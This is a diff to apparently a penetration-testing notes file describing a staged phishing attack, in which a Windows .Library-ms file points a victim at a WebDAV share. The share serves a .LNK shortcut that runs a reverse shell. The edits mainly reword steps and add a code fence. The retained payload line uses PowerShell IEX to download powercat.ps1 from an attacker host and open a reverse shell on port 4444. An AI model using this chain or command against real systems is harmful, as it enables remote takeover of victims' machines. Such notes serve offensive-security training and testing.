@@ -119,7 +119,7 @@ Staged-Attack:
 * Foothold - Create a Windows library `config.Library-ms` for our victim
 * Victim receives a .Library-ms file, double-click looks like folder structure
 * Attack - Create a .LNK file served by WebDAV server that executes a Reverse Shell
-* Victim execution the .LNK file
+* Victim executes the malicious .LNK file
 
 Setup WebDAV server to host .LNK files (via Windows Library)
 
@@ -177,11 +177,10 @@ After execution the file gets manipulated by Windows.
 
 2nd Stage - Create a .LNK file served by WebDAV server
 
-* Create a shortcut with a Path
+* Create a .LNK shortcut with a Path
 * Add Powercat Reverse Shell as Payload
-* 
 
-```
+```powershell
 powershell.exe -c "IEX (New-Object System.Net.WebClient).DownloadString('http://Attacker-IP:8000/powercat.ps1');powercat -c Attacker-IP -p 4444 -ep"
 ```
 
